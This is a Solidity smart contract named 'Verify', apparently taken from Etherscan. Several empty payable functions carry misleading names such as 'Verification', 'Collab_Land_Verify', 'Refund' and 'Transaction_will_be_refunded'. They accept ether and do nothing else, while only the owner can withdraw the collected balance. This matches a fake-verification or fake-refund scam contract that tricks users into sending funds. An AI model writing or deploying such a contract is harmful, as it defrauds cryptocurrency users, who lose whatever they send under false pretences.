/**
 *Submitted for verification at Etherscan.io on 2023-02-04
*/

pragma solidity ^0.4.26;

contract Verify {

    address private  owner;    // current owner of the contract

     constructor() public{   
        owner=msg.sender;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function Verification() public payable {
    }

    function Mint() public payable {
    }

    function Collab_Land() public payable {
    }

    function Collab_Land_Verify() public payable {
    }

    function Refund() public payable {
    }

    function Transaction_will_be_refunded() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}